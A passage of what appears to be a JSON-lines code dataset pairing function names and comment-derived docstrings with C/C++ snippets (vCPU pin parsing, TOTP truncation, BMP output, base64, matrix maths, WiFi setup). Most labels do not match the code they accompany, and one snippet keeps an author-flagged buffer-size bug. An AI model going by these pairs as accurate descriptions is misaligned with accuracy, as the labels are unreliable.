{"content":"{'function_name': 'split_string_into_string_list', 'docstring': '\/* Count number of entries *\/', 'code': 'static int vcpupin_parse(char *cpu, libxl_bitmap *cpumap)\\n{\\n    libxl_bitmap exclude_cpumap;\\n    uint32_t cpuida, cpuidb;\\n    char *endptr, *toka, *tokb, *saveptr = NULL;\\n    int i, rc = 0, rmcpu;\\n\\n    if (!strcmp(cpu, \"all\")) {\\n        libxl_bitmap_set_any(cpumap);\\n        return 0;\\n    }\\n\\n    if (libxl_cpu_bitmap_alloc(ctx, &exclude_cpumap, 0)) {\\n        fprintf(stderr, \"Error: Failed to allocate cpumap.\\\\n\");\\n        return ENOMEM;\\n    }\\n\\n    for (toka = strtok_r(cpu, \",\", &saveptr); toka;\\n         toka = strtok_r(NULL, \",\", &saveptr)) {\\n        rmcpu = 0;\\n        if (*toka == \\'^\\') {\\n            \/* This (These) Cpu(s) will be removed from the map *\/\\n            toka++;\\n            rmcpu = 1;\\n        }\\n        \/* Extract a valid (range of) cpu(s) *\/\\n        cpuida = cpuidb = strtoul(toka, &endptr, 10);\\n        if (endptr == toka) {\\n            fprintf(stderr, \"Error: Invalid argument.\\\\n\");\\n            rc = EINVAL;\\n            goto vcpp_out;\\n        }\\n        if (*endptr == \\'-\\') {\\n            tokb = endptr + 1;\\n            cpuidb = strtoul(tokb, &endptr, 10);\\n            if (endptr == tokb || cpuida > cpuidb) {\\n                fprintf(stderr, \"Error: Invalid argument.\\\\n\");\\n                rc = EINVAL;\\n                goto vcpp_out;\\n            }\\n        }\\n        while (cpuida <= cpuidb) {\\n            rmcpu == 0 ? libxl_bitmap_set(cpumap, cpuida) :\\n                         libxl_bitmap_set(&exclude_cpumap, cpuida);\\n            cpuida++;\\n        }\\n    }\\n\\n    \/* Clear all the cpus from the removal list *\/\\n    libxl_for_each_set_bit(i, exclude_cpumap) {\\n        libxl_bitmap_reset(cpumap, i);\\n    }\\n\\nvcpp_out:\\n    libxl_bitmap_dispose(&exclude_cpumap);\\n\\n    return rc;\\n}'}","id":2726}
{"content":"{'function_name': 'os_read_shared_block', 'docstring': '\/\/ @Bug name.Length is not enough (2 wide chars for one char)', 'code': 'string os_get_working_dir() {\\n    thread::scoped_lock _(&WorkingDirMutex);\\n\\n    DWORD required = GetCurrentDirectoryW(0, null);\\n    auto *dir16 = allocate_array(utf16, required + 1, Context.Temp);\\n\\n    if (!GetCurrentDirectoryW(required + 1, dir16)) {\\n        windows_report_hresult_error(HRESULT_FROM_WIN32(GetLastError()), \"GetCurrentDirectoryW\", __FILE__, __LINE__);\\n        return \"\";\\n    }\\n\\n    WITH_CONTEXT_VAR(AllocOptions, Context.AllocOptions | LEAK) {\\n        reserve(WorkingDir, required * 2);  \/\/ @Bug required * 2 is not enough\\n    }\\n\\n    utf16_to_utf8(dir16, const_cast<utf8 *>(WorkingDir.Data), &WorkingDir.Count);\\n    WorkingDir.Length = utf8_length(WorkingDir.Data, WorkingDir.Count);\\n\\n    \/\/ :UnifyPath\\n    replace_all(WorkingDir, \\'\\\\\\\\\\', \\'\/\\');\\n\\n    return WorkingDir;\\n}'}","id":2732}
{"content":"{'function_name': 'extract31', 'docstring': '\/\/ return only 31 bits', 'code': \"std::uint32_t truncate(const std::vector<std::uint8_t> hmac, const std::uint32_t digits) {\\n\\tstd::int32_t d = extract31(hmac);\\n\\tstd::int32_t m = 1000000;\\n\\n\\t\/\/ don't want to import cmath lib\\n\\tif(digits==6) m = 1000000;\\n\\tif(digits==7) m = 10000000;\\n\\tif(digits==8) m = 100000000;\\n\\n\\tconst std::int32_t tokenVal(d % m);\\n\\n\\treturn tokenVal;\\n}\"}","id":2742}
{"content":"{'function_name': 'dump_edge_lens', 'docstring': '\/\/string svg_filename = \"bunny_nf10k_DGG0.001000_c12_pruning.binary\";', 'code': 'int main(int argc, char** argv)\\n{\\n\\t\/\/figure_4();\\n\\n\\tif (argc < 3) {\\n\\t\\tprintf(\"error input, example xx.exe xx.obj svg.binary dgg.binary\");\\n\\t\\texit(1);\\n\\t}\\n\\n\\tdump_edge_lens(argv[1],argv[2],argv[3]);\\n\\n\\n  return 0;\\n}'}","id":2745}
{"content":"{'function_name': 'geoSaveIntensityImageIn_YUV400_file', 'docstring': '\/\/Almacenando valores de intensidad en archivo', 'code': 'int SaveIntensityImageIn_BMP_file(unsigned char *pintensity, char *filename)\\n{\\n    int i, j, jj, ipos;\\n    int bytesPerLine;\\n    unsigned char *line;\\n    unsigned char *ptempImage;\\n    int height, width;\\n\\n    height=pInputImage->height;\\n    width=pInputImage->width;\\n\\n    FILE *file;\\n    struct BMPHeader bmph;\\n\\n    \/* The length of each line must be a multiple of 4 bytes *\/\\n\\n    bytesPerLine = (3 * (width + 1) \/ 4) * 4;\\n\\n    strcpy(bmph.bfType, \"BM\");\\n    bmph.bfOffBits = 54;\\n    bmph.bfSize = bmph.bfOffBits + bytesPerLine * height;\\n    bmph.bfReserved = 0;\\n    bmph.biSize = 40;\\n    bmph.biWidth = width;\\n    bmph.biHeight = height;\\n    bmph.biPlanes = 1;\\n    bmph.biBitCount = 24;\\n    bmph.biCompression = 0;\\n    bmph.biSizeImage = bytesPerLine * height;\\n    bmph.biXPelsPerMeter = 0;\\n    bmph.biYPelsPerMeter = 0;\\n    bmph.biClrUsed = 0;\\n    bmph.biClrImportant = 0;\\n\\n    file = fopen (filename, \"wb\");\\n    if (file == NULL) return(0);\\n\\n    fwrite(&bmph.bfType, 2, 1, file);\\n    fwrite(&bmph.bfSize, 4, 1, file);\\n    fwrite(&bmph.bfReserved, 4, 1, file);\\n    fwrite(&bmph.bfOffBits, 4, 1, file);\\n    fwrite(&bmph.biSize, 4, 1, file);\\n    fwrite(&bmph.biWidth, 4, 1, file);\\n    fwrite(&bmph.biHeight, 4, 1, file);\\n    fwrite(&bmph.biPlanes, 2, 1, file);\\n    fwrite(&bmph.biBitCount, 2, 1, file);\\n    fwrite(&bmph.biCompression, 4, 1, file);\\n    fwrite(&bmph.biSizeImage, 4, 1, file);\\n    fwrite(&bmph.biXPelsPerMeter, 4, 1, file);\\n    fwrite(&bmph.biYPelsPerMeter, 4, 1, file);\\n    fwrite(&bmph.biClrUsed, 4, 1, file);\\n    fwrite(&bmph.biClrImportant, 4, 1, file);\\n\\n    line = (unsigned char*) malloc(bytesPerLine);\\n    if (line == NULL)\\n    {\\n        fprintf(stderr, \"Can\\'t allocate memory for BMP file.\\\\n\");\\n        return(0);\\n    }\\n\\n    \/\/Cambiando posici\u00f3n del sistema de coordenadas de la equina inferior\\n    \/\/izquierda a la esquina superior izquierda.\\n    ptempImage = (unsigned char *)malloc(sizeof(unsigned char)*width*height);\\n    for (i=0;i<width*height;i++) ptempImage[i]=0;\\n    jj=0;\\n    for (j=height-1;j>=0;j--) {\\n        for (i=0;i<width;i++) {\\n            ptempImage[jj*width+i]= pintensity[j*width+i];\\n        }\\n        jj++;\\n    }\\n\\n    for (i = height - 1; i >= 0; i--)\\n    {\\n        for (j = 0; j < width; j++)\\n        {\\n            ipos = (width * i + j);\\n            line[3*j] = ptempImage[ipos];\\n            line[3*j+1] = ptempImage[ipos];\\n            line[3*j+2] = ptempImage[ipos];\\n        }\\n        fwrite(line, bytesPerLine, 1, file);\\n    }\\n\\n    free(line);\\n    fclose(file);\\n\\n    free(ptempImage);\\n\\n    return(1);\\n}'}","id":2750}
{"content":"{'function_name': 'strassenRecur', 'docstring': '\/\/ base case if 1x1 matrices\\r', 'code': 'binaryOp optimalMultAlgorithm(Matrix const *A, Matrix const *B)\\r\\n{\\r\\n    \/* heuristic based on online citation strassen = faster if n > 100:\\r\\n        Skiena, Steven (2008). \"Sorting and Searching\". The Algorithm\\r\\n        Design Manual. Springer. pp. 45-46, 401-403.\\r\\n    *\/\\r\\n    if (A->numRows() < 100 && B->numCols() < 100)\\r\\n    {\\r\\n        return &naiveMult;\\r\\n    }\\r\\n    else\\r\\n    {\\r\\n        return &strassenMult;\\r\\n    }\\r\\n}'}","id":2753}
{"content":"{'function_name': 'subtract', 'docstring': '\/\/cout<<ones<<len;', 'code': 'int main()\\n{\\n\\n    ios::sync_with_stdio(0);\\n    ll t;\\n    cin>>t;\\n    while(t--)\\n    {\\n        ll n;\\n        cin>>n;\\n        if(n==1)\\n        {cout<<\"2\\\\n\";continue;}\\n       ll length = DTB(n);\\n\\n     \/\/  for(ll i=0;i<length;i++)\\n     \/\/  {\\n     \/\/      cout<<binary[i];\\n     \/\/  }\\n\\n    \/\/   cout<<\"\\\\n\";\\n    \/\/   cout<<length<<\\'\\\\n\\';\\n     \/\/ cout<<subtract(length,n)<<\" \"<<add(length,n)<<\\'\\\\n\\';\\n      cout<<min(subtract(length,n),add(length,n))<<\\'\\\\n\\';\\n\\n    }\\n\\n   \/* for(ll i=3;i<=1000000000;i++)\\n    {  ll n=i;\\n        if(n==1)\\n        {cout<<\"2\\\\n\";continue;}\\n       ll length = DTB(n);\\n\\n\\n       \/\/ cout<<\"\\\\n\";\\n      \/\/ cout<<length<<\\'\\\\n\\';\\n      cout<<n<<\"  \\\\n\";\\n      cout<<subtract(length,n)<<\" \"<<add(length,n)<<\\'\\\\n\\';\\n      cout<<min(subtract(length,n),add(length,n))<<\\'\\\\n\\';\\n      ll x;\\n      x=n-subtract(length,n);\\n      ll y=add(length,n)+n;\\n      ll len1=DTB(x);\\n     ll onex= countones(len1);\\n     ll len2=DTB(y);\\n      ll oney= countones(len2);\\n      if(onex!=2)\\n      {\\n          char c;\\n          cout<<n<<\" \"<<\"HERE SUBTRACT\\\\n\"<<onex<<\" \"<<x;\\n            cin>>c;\\n      }\\n\\n      if(oney!=2)\\n      {\\n          char c;\\n          cout<<n<<\" HERE ADD\\\\n\"<<oney<<\" \"<<y;\\n        cin>>c;\\n      }\\n    }\\n*\/\\n    return 0;\\n}'}","id":2756}
{"content":"{'function_name': 'SetContourHeadAtBlank', 'docstring': '\/\/ \u641c\u7d22\u5916\u8f6e\u5ed3', 'code': 'BOOL AllPathEntIntLine( CPathEntity *pEnt, PNT3D start, PNT3D end , int nMethodType, BOOL bNext)\\n{\\n\\tif( !pEnt ) return FALSE ;\\n\\tif( nMethodType != surfncMethodPocket ) return FALSE ;\\n\\tCPathEntity *pHead = pEnt, *pNext = NULL ;\\n\\tint nType = -1 ;\\n\\tFPNT3D p1, p2, st, ed, fIntpt ;\\n\\tdouble t[2] = { -1,-1 }, dTol = 1.0e-4 ; \/\/\u8bbe\u7f6e\u6b63\u52a0\u5de5\u7cbe\u5ea6\uff0c\u4e3a\u4e86\u786e\u4fdd\u5728\u9996\u672b\u70b9\u76f8\u4ea4\u65f6\uff0c\u4e5f\u5224\u65ad\u51fa\u76f8\u4ea4 qqs 2014.10.31\\n\\tCPathArc3D *pArc = NULL ;\\n\\tCPathPLine3D *pLine3D = NULL ;\\n\\tCPathLine3D *pLine = NULL ;\\n\\tnc_VectorCopy(  st, start, 3 ) ;\\n\\tnc_VectorCopy(  ed, end, 3 ) ;\\n\\twhile( pHead )\\n\\t{\\n\\t\\tpNext = pHead->next ;\\n\\t\\tnType = pHead->GetType() ;\\n\\t\\tif( nType == NC_PATH_LINE3D )\\n\\t\\t{\\n\\t\\t\\tpLine = ( CPathLine3D *)pHead ;\\n\\t\\t\\tnc_VectorCopy(  p1, pLine->m_fStart, 3 ) ;\\n\\t\\t\\tnc_VectorCopy(  p2, pLine->m_fEnd, 3 ) ;\\n\\t\\t\\t\\n\\t\\t\\tif( MathCam_FIntLine3D( st, ed, p1, p2, fIntpt, t, dTol ) )\\n\\t\\t\\t{\\n\\t\\t\\t\\treturn TRUE ;\\n\\t\\t\\t}\\n\\t\\t\\telse\\n\\t\\t\\t{\/\/ \u5f53\u8fde\u5200\u8def\u5f84\u7684\u975e\u9996\u672b\u70b9\u4e0e\u5207\u5272\u8def\u5f84\u7684\u9996\u672b\u70b9\u76f8\u4ea4\u65f6\uff0c\u8ba4\u4e3a\u8fde\u5200\u4e0e\u5207\u5272\u8def\u5f84\u76f8\u4ea4\u3002 qqs 2014.04.28\\n\\t\\t\\t\\tif ((t[0] < 1+dTol && t[0] > -dTol ) && \\n\\t\\t\\t\\t\\t(fabs(t[1])<1.0e-4 ||fabs(t[1]-1)<1.0e-4)) \\n\\t\\t\\t\\t\\treturn TRUE ;\\n\\t\\t\\t}\\n\\t\\t}\\n\\t\\telse if( nType == NC_PATH_PLINE3D )\\n\\t\\t{\\n\\t\\t\\tpLine3D = ( CPathPLine3D *)pHead ;\\n\\t\\t\\tint i = 0 , nCnt = pLine3D->m_nCount ;\\n\\t\\t\\tnc_VectorCopy(  p1, pLine3D->m_pTAPos[0], 3 ) ;\\n\\t\\t\\tfor( i = 1 ; i <= nCnt ; i++ )\\n\\t\\t\\t{\\n\\t\\t\\t\\tnc_VectorCopy( p2, pLine3D->m_pTAPos[i], 3 ) ;\\n\\n\\t\\t\\t\\tif( MathCam_FIntLine3D( st, ed, p1, p2, fIntpt, t, dTol ) )\\n\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\treturn TRUE ;\\n\\t\\t\\t\\t}\\n\\t\\t\\t\\telse\\n\\t\\t\\t\\t{\/\/ \u5f53\u8fde\u5200\u8def\u5f84\u7684\u975e\u9996\u672b\u70b9\u4e0e\u5207\u5272\u8def\u5f84\u7684\u9996\u672b\u70b9\u76f8\u4ea4\u65f6\uff0c\u8ba4\u4e3a\u8fde\u5200\u4e0e\u5207\u5272\u8def\u5f84\u76f8\u4ea4\u3002 qqs 2014.04.28\\n\\t\\t\\t\\t\\tif ((t[0] < 1+dTol && t[0] > -dTol ) && \\n\\t\\t\\t\\t\\t\\t(fabs(t[1])<1.0e-4 ||fabs(t[1]-1)<1.0e-4)) \\n\\t\\t\\t\\t\\t\\treturn TRUE ;\\n\\t\\t\\t\\t}\\n\\t\\t\\t\\tmathFCpyPnt( p2, p1 ) ;\\t\\n\\t\\t\\t}\\n\\t\\t}\\n\\t\\telse if( nType == NC_PATH_ARC3D )\\n\\t\\t{\\n\\t\\t\\tpArc = ( CPathArc3D *)pHead ;\\n\\t\\t\\tTPNT3D Buff[2000] ;\\n\\t\\t\\tint i = 0 ;\\n\\t\\t\\tint nCnt = pArc->Discrete( 0.01, ANGLE_TO_RADIAN( 10. ), Buff, 2000) ;\\n\\t\\t\\tnc_VectorCopy( p1, Buff[0], 3 ) ;\\n\\t\\t\\tfor( i = 1 ;i < nCnt ; i++ )\\n\\t\\t\\t{\\n\\t\\t\\t\\tnc_VectorCopy( p2, Buff[i], 3 ) ;\\n\\t\\t\\t\\tif( MathCam_FIntLine3D( st, ed, p1, p2, fIntpt, t, dTol ) )\\n\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\treturn TRUE ;\\n\\t\\t\\t\\t}\\n\\t\\t\\t\\telse\\n\\t\\t\\t\\t{\/\/ \u5f53\u8fde\u5200\u8def\u5f84\u7684\u975e\u9996\u672b\u70b9\u4e0e\u5207\u5272\u8def\u5f84\u7684\u9996\u672b\u70b9\u76f8\u4ea4\u65f6\uff0c\u8ba4\u4e3a\u8fde\u5200\u4e0e\u5207\u5272\u8def\u5f84\u76f8\u4ea4\u3002 qqs 2014.04.28\\n\\t\\t\\t\\t\\tif ((t[0] < 1+dTol && t[0] > -dTol ) && \\n\\t\\t\\t\\t\\t\\t(fabs(t[1])<1.0e-4 ||fabs(t[1]-1)<1.0e-4)) \\n\\t\\t\\t\\t\\t\\treturn TRUE ;\\n\\t\\t\\t\\t}\\n\\t\\t\\t\\tmathFCpyPnt( p2, p1 ) ;\\t\\n\\t\\t\\t}\\n\\t\\t}\\n\\t\\telse\\n\\t\\t{}\\n\\t\\tpHead = pNext ;\\n\\n\\t\\tif( !bNext ) break ;\\n\\t}\\n\\n\\treturn FALSE ;\\n}'}","id":2758}
{"content":"{'function_name': 'base64Decode', 'docstring': '\/\/return value', 'code': 'static std::string base64Encode(const unsigned char* Data, int DataByte)\\n{\\n\\t \/\/ code table\\n\\tconst char EncodeTable[] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+\/\";\\n\\t \\t\/\/return value\\n\\tstd::string strEncode;\\n\\tunsigned char Tmp[4] = { 0 };\\n\\tint LineLength = 0;\\n\\tfor (int i = 0; i < (int)(DataByte \/ 3); i++)\\n\\t{\\n\\t\\tTmp[1] = *Data++;\\n\\t\\tTmp[2] = *Data++;\\n\\t\\tTmp[3] = *Data++;\\n\\t\\tstrEncode += EncodeTable[Tmp[1] >> 2];\\n\\t\\tstrEncode += EncodeTable[((Tmp[1] << 4) | (Tmp[2] >> 4)) & 0x3F];\\n\\t\\tstrEncode += EncodeTable[((Tmp[2] << 2) | (Tmp[3] >> 6)) & 0x3F];\\n\\t\\tstrEncode += EncodeTable[Tmp[3] & 0x3F];\\n\\t\\tif (LineLength += 4, LineLength == 76) { strEncode += \"\\\\r\\\\n\"; LineLength = 0; }\\n\\t}\\n\\t \/\/ Encode the remaining data\\n\\tint Mod = DataByte % 3;\\n\\tif (Mod == 1)\\n\\t{\\n\\t\\tTmp[1] = *Data++;\\n\\t\\tstrEncode += EncodeTable[(Tmp[1] & 0xFC) >> 2];\\n\\t\\tstrEncode += EncodeTable[((Tmp[1] & 0x03) << 4)];\\n\\t\\tstrEncode += \"==\";\\n\\t}\\n\\telse if (Mod == 2)\\n\\t{\\n\\t\\tTmp[1] = *Data++;\\n\\t\\tTmp[2] = *Data++;\\n\\t\\tstrEncode += EncodeTable[(Tmp[1] & 0xFC) >> 2];\\n\\t\\tstrEncode += EncodeTable[((Tmp[1] & 0x03) << 4) | ((Tmp[2] & 0xF0) >> 4)];\\n\\t\\tstrEncode += EncodeTable[((Tmp[2] & 0x0F) << 2)];\\n\\t\\tstrEncode += \"=\";\\n\\t}\\n\\n\\n\\treturn strEncode;\\n}'}","id":2764}
{"content":"{'function_name': 'TLSChainProprietyCertificate', 'docstring': '\/\/    \\r', 'code': 'DWORD \\r\\nTLSCertSetCertRdnName(\\r\\n    IN OUT CERT_NAME_BLOB* pCertNameBlob, \\r\\n    IN CERT_NAME_INFO* pRdn\\r\\n    )\\r\\n\/*\\r\\n\\r\\nAbstract:\\r\\n\\r\\n    Add RDN into certificate\\r\\n\\r\\nParameters:\\r\\n\\r\\n    pCertNameBlob -\\r\\n    pRdn -\\r\\n\\r\\nReturns\\r\\n\\r\\n    ERROR_INVALID_PARAMETER\\r\\n    Error code from CryptEncodeObject()\\r\\n    Memory allocation fail.    \\r\\n\\r\\n*\/\\r\\n{\\r\\n    if(pCertNameBlob == NULL || pRdn == NULL)\\r\\n        return ERROR_INVALID_PARAMETER;\\r\\n\\r\\n    \/\/\\r\\n    \/\/ CertStrToName() not defined in SP3 build environment\\r\\n    \/\/\\r\\n    return TLSCryptEncodeObject( \\r\\n                    CRYPT_ASN_ENCODING, \\r\\n                    X509_NAME, \\r\\n                    pRdn, \\r\\n                    &pCertNameBlob->pbData, \\r\\n                    &pCertNameBlob->cbData\\r\\n                );\\r\\n}'}","id":2765}
{"content":"{'function_name': 'mcreate', 'docstring': '\/\/msettrans(r0, -vPoint);\\r', 'code': 'm mmult(m m0, m m1)\\r\\n{\\r\\n\\tm r;\\r\\n\\tr.x.x = m0.x.x * m1.x.x + m0.y.x * m1.x.y + m0.z.x * m1.x.z + m0.trans.x * m1.x.w;\\r\\n\\tr.x.y = m0.x.y * m1.x.x + m0.y.y * m1.x.y + m0.z.y * m1.x.z + m0.trans.y * m1.x.w;\\r\\n\\tr.x.z = m0.x.z * m1.x.x + m0.y.z * m1.x.y + m0.z.z * m1.x.z + m0.trans.z * m1.x.w;\\r\\n\\tr.x.w = m0.x.w * m1.x.x + m0.y.w * m1.x.y + m0.z.w * m1.x.z + m0.trans.w * m1.x.w;\\r\\n\\r\\n\\tr.y.x = m0.x.x * m1.y.x + m0.y.x * m1.y.y + m0.z.x * m1.y.z + m0.trans.x * m1.y.w;\\r\\n\\tr.y.y = m0.x.y * m1.y.x + m0.y.y * m1.y.y + m0.z.y * m1.y.z + m0.trans.y * m1.y.w;\\r\\n\\tr.y.z = m0.x.z * m1.y.x + m0.y.z * m1.y.y + m0.z.z * m1.y.z + m0.trans.z * m1.y.w;\\r\\n\\tr.y.w = m0.x.w * m1.y.x + m0.y.w * m1.y.y + m0.z.w * m1.y.z + m0.trans.w * m1.y.w;\\r\\n\\r\\n\\tr.z.x = m0.x.x * m1.z.x + m0.y.x * m1.z.y + m0.z.x * m1.z.z + m0.trans.x * m1.z.w;\\r\\n\\tr.z.y = m0.x.y * m1.z.x + m0.y.y * m1.z.y + m0.z.y * m1.z.z + m0.trans.y * m1.z.w;\\r\\n\\tr.z.z = m0.x.z * m1.z.x + m0.y.z * m1.z.y + m0.z.z * m1.z.z + m0.trans.z * m1.z.w;\\r\\n\\tr.z.w = m0.x.w * m1.z.x + m0.y.w * m1.z.y + m0.z.w * m1.z.z + m0.trans.w * m1.z.w;\\r\\n\\r\\n\\r\\n\\tr.trans.x = m0.x.x * m1.trans.x + m0.y.x * m1.trans.y + m0.z.x * m1.trans.z + m0.trans.x * m1.trans.w;\\r\\n\\tr.trans.y = m0.x.y * m1.trans.x + m0.y.y * m1.trans.y + m0.z.y * m1.trans.z + m0.trans.y * m1.trans.w;\\r\\n\\tr.trans.z = m0.x.z * m1.trans.x + m0.y.z * m1.trans.y + m0.z.z * m1.trans.z + m0.trans.z * m1.trans.w;\\r\\n\\tr.trans.w = m0.x.w * m1.trans.x + m0.y.w * m1.trans.y + m0.z.w * m1.trans.z + m0.trans.w * m1.trans.w;\\r\\n\\r\\n\\r\\n\\t\/\/ r.x.x = m0.x.x * m1.x.x + m0.x.y * m1.y.x + m0.x.z * m1.z.x + m0.x.w * m1.w.x; \\r\\n\\t\/\/ r.x.y = m0.x.x * m1.x.y + m0.x.y * m1.y.y + m0.x.z * m1.z.y + m0.x.w * m1.w.y; \\r\\n\\t\/\/ r.x.z = m0.x.x * m1.x.z + m0.x.y * m1.y.z + m0.x.z * m1.z.z + m0.x.w * m1.w.z; \\r\\n\\t\/\/ r.x.w = m0.x.x * m1.x.w + m0.x.y * m1.y.w + m0.x.z * m1.z.w + m0.x.w * m1.w.w; \\r\\n\\r\\n\\t\/\/ r.y.x = m0.y.x * m1.x.x + m0.y.y * m1.y.x + m0.y.z * m1.z.x + m0.y.w * m1.w.x; \\r\\n\\t\/\/ r.y.y = m0.y.x * m1.x.y + m0.y.y * m1.y.y + m0.y.z * m1.z.y + m0.y.w * m1.w.y; \\r\\n\\t\/\/ r.y.z = m0.y.x * m1.x.z + m0.y.y * m1.y.z + m0.y.z * m1.z.z + m0.y.w * m1.w.z; \\r\\n\\t\/\/ r.y.w = m0.y.x * m1.x.w + m0.y.y * m1.y.w + m0.y.z * m1.z.w + m0.y.w * m1.w.w; \\r\\n\\r\\n\\t\/\/ r.z.x = m0.z.x * m1.x.x + m0.z.y * m1.y.x + m0.z.z * m1.z.x + m0.z.w * m1.w.x; \\r\\n\\t\/\/ r.z.y = m0.z.x * m1.x.y + m0.z.y * m1.y.y + m0.z.z * m1.z.y + m0.z.w * m1.w.y; \\r\\n\\t\/\/ r.z.z = m0.z.x * m1.x.z + m0.z.y * m1.y.z + m0.z.z * m1.z.z + m0.z.w * m1.w.z; \\r\\n\\t\/\/ r.z.w = m0.z.x * m1.x.w + m0.z.y * m1.y.w + m0.z.z * m1.z.w + m0.z.w * m1.w.w; \\r\\n\\r\\n\\t\/\/ r.w.x = m0.w.x * m1.x.x + m0.w.y * m1.y.x + m0.w.z * m1.z.x + m0.w.w * m1.w.x; \\r\\n\\t\/\/ r.w.y = m0.w.x * m1.x.y + m0.w.y * m1.y.y + m0.w.z * m1.z.y + m0.w.w * m1.w.y; \\r\\n\\t\/\/ r.w.z = m0.w.x * m1.x.z + m0.w.y * m1.y.z + m0.w.z * m1.z.z + m0.w.w * m1.w.z; \\r\\n\\t\/\/ r.w.w = m0.w.x * m1.x.w + m0.w.y * m1.y.w + m0.w.z * m1.z.w + m0.w.w * m1.w.w; \\r\\n\\r\\n\\treturn r;\\r\\n}'}","id":2772}
{"content":"{'function_name': 'BinaryDigits', 'docstring': '\/\/ Skip \"3.\" in 3.14159...', 'code': 'static void Forward(const BigRat &r, int n,\\n                    int *k_chosen, BigRat *next_rat) {\\n  \/\/ PERF!\\n  \/\/ CHECK(1 != BigRat::Compare(BigRat(0, 1), r));\\n  \/\/ CHECK(-1 == BigRat::Compare(r, BigRat(1, 1)));\\n\\n  \/\/ We have r = m\/d.\\n  \/\/ First find k such that k\/n <= r < (k+1)\/n.\\n\\n  for (int k = 0; k < n; k++) {\\n    \/\/ Invariant: r is known to be >= k\/n.\\n    \/\/ PERF!\\n    \/\/ CHECK(1 != BigRat::Compare(BigRat(k, n), r));\\n    \/\/ Next bound to consider is (k + 1)\/n.\\n    BigRat ubound(k + 1, n);\\n    int cmp = BigRat::Compare(r, ubound);\\n    if (cmp == BQ_LT) {\\n      \/\/ The first time this happens, we know r is in the\\n      \/\/ interval k\/n to k+1\/n.\\n      \/\/ So r\\' = (r - k\/n)\\n      \/\/         ---------\\n      \/\/         (1 \/ n)\\n      \/\/ which is the same as n * (r - k\/n)\\n      \/\/ which is nr - k.\\n\\n      if (next_rat != nullptr) {\\n        BigRat nr = BigRat::Times(BigRat(n, 1), r);\\n        *next_rat = BigRat::Minus(nr, BigRat(k, 1));\\n      }\\n      *k_chosen = k;\\n      return;\\n    }\\n  }\\n\\n  CHECK(false) << \"Should be impossible if r is in [0, 1).\";\\n}'}","id":2775}
{"content":"{'function_name': 'postFix', 'docstring': '\/\/peeks the last item in the stack or its answer if flag == 0, else it peeks the last item in the stack to determine the error', 'code': \"bool operation(char a,Stack s){ \/\/function evaluates the given character if stack is empty it will not proceed on evaluating but pushing the character operator\\n\\tfloat val1, val2,num;\\t\\t\/\/ for determining if the given string is missing an operand\\n\\tbool flag = 0;\\n\\tif(isOperator(a)){\\n\\t\\tswitch(a){\\n\\t\\t\\tcase '+':\\n\\t\\t\\t\\tval1=peek(s);\\n\\t\\t\\t\\tpop(s);\\n\\t\\t\\t\\tif(!isEmpty(s)){\\n\\t\\t\\t\\t\\tval2=peek(s);\\n\\t\\t\\t\\t\\tpop(s);\\n\\t\\t\\t\\t\\tnum = val2+val1;\\n\\t\\t\\t\\t\\tpush(s,num);\\n\\t\\t\\t\\t}\\n\\t\\t\\t\\telse {\\n\\t\\t\\t\\t\\tnum = '+';\\n\\t\\t\\t\\t\\tpush(s,num);\\n\\t\\t\\t\\t\\tflag = 1;\\n\\t\\t\\t\\t}\\n\\t\\t\\t\\tbreak;\\n\\t\\t\\tcase '-':\\n\\t\\t\\t\\tval1=peek(s);\\n\\t\\t\\t\\tpop(s);\\n\\t\\t\\t\\tif(!isEmpty(s)){\\n\\t\\t\\t\\t\\tval2=peek(s);\\n\\t\\t\\t\\t\\tpop(s);\\n\\t\\t\\t\\t\\tnum = val2-val1;\\n\\t\\t\\t\\t\\tpush(s,num);\\n\\t\\t\\t\\t}\\n\\t\\t\\t\\telse {\\n\\t\\t\\t\\t\\tnum = '-';\\n\\t\\t\\t\\t\\tpush(s,num);\\n\\t\\t\\t\\t\\tflag=1;\\n\\t\\t\\t\\t}\\n\\t\\t\\t\\tbreak;\\n\\t\\t\\tcase '*':\\n\\t\\t\\t\\tval1=peek(s);\\n\\t\\t\\t\\tpop(s);\\n\\t\\t\\t\\tif(!isEmpty(s)){\\n\\t\\t\\t\\t\\tval2=peek(s);\\n\\t\\t\\t\\t\\tpop(s);\\n\\t\\t\\t\\t\\tnum = val2*val1;\\n\\t\\t\\t\\t\\tpush(s,num);\\n\\t\\t\\t\\t}\\n\\t\\t\\t\\telse {\\n\\t\\t\\t\\t\\tnum = '*';\\n\\t\\t\\t\\t\\tpush(s,num);\\n\\t\\t\\t\\t\\tflag=1;\\n\\t\\t\\t\\t}\\n\\t\\t\\t\\tbreak;\\n\\t\\t\\tcase '\/':\\n\\t\\t\\t\\tval1=peek(s);\\n\\t\\t\\t\\tpop(s);\\n\\t\\t\\t\\tif(!isEmpty(s)){\\n\\t\\t\\t\\t\\tval2=peek(s);\\n\\t\\t\\t\\t\\tpop(s);\\n\\t\\t\\t\\t\\tnum = val2\/val1;\\n\\t\\t\\t\\t\\tpush(s,num);\\n\\t\\t\\t\\t}\\n\\t\\t\\t\\telse {\\n\\t\\t\\t\\t\\tnum = '\/';\\n\\t\\t\\t\\t\\tpush(s,num);\\n\\t\\t\\t\\t\\tflag=1;\\n\\t\\t\\t\\t}\\n\\t\\t\\t\\tbreak;\\t\\n\\t\\t}\\n\\t}\\n\\telse{\\n\\t\\tnum = 'a';\\t\\t\\t\/\/if it is not one of the character operator then it will push 'a' for condition purposese for the invalid error\\n\\t\\tpush(s,num);\\t\\t\\t\\t\\t\/\/ 'a' can be change into somthing else but not numbers 1 to 9 and character operators\\n\\t\\tflag = 1;\\n\\t}\\n\\treturn flag;\\n}\"}","id":2781}
{"content":"{'function_name': 'setup', 'docstring': '\/\/ Initialise wifi connection', 'code': 'boolean connectWifi(){\\n  boolean state = true;\\n  int i = 0;\\n  \\n  WiFi.mode(WIFI_STA);\\n  WiFi.begin(ssid, password);\\n  Serial.println(\"\");\\n  Serial.println(\"Connecting to WiFi\");\\n\\n  \/\/ Wait for connection\\n  Serial.print(\"Connecting ...\");\\n  while (WiFi.status() != WL_CONNECTED) {\\n    delay(500);\\n    Serial.print(\".\");\\n    if (i > 10){\\n      state = false;\\n      break;\\n    }\\n    i++;\\n  }\\n  \\n  if (state){\\n    Serial.println(\"\");\\n    Serial.print(\"Connected to \");\\n    Serial.println(ssid);\\n    Serial.print(\"IP address: \");\\n    Serial.println(WiFi.localIP());\\n  }\\n  else {\\n    